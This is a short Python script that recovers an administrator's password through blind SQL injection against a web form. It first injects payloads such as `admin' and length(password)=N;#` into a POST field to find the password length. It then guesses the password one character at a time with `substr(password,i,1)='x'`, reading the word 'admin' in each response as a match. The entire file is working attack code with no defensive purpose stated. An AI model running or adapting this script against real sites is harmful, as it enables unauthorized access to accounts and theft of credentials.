import requests
import argparse
from urllib.parse import urlparse, parse_qsl, urlsplit
import string

alp = string.printable
parser = argparse.ArgumentParser(
    description='Script scan password by blind sqli')
parser.add_argument('--url', help='URL uploader', required=True)
parser.add_argument('--data', help='Body param request')
args = parser.parse_args()
url = args.url
data = args.data


def url_validator(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc, result.path])
    except:
        return False


passwd = ''
l = 1
while True:
    payload = data.replace(
        '$', f"admin'+and+length(password)={l};%23")
    d = dict(parse_qsl(urlsplit('?' + payload).query))
    # print(d)
    r = requests.post(url, data=d)
    if 'admin' in r.text:
        print('length password: ', l)
        break
    l += 1
for i in range(1, l+1):
    for x in alp:
        payload = data.replace(
            '$', f"admin'+and+substr(password,{str(i)},1)='{x}';%23")
        d = dict(parse_qsl(urlsplit('?' + payload).query))
        # print(d)
        r = requests.post(url, data=d)
        if 'admin' in r.text:
            passwd += x
            print(passwd)
            break
print('password is: ', passwd)
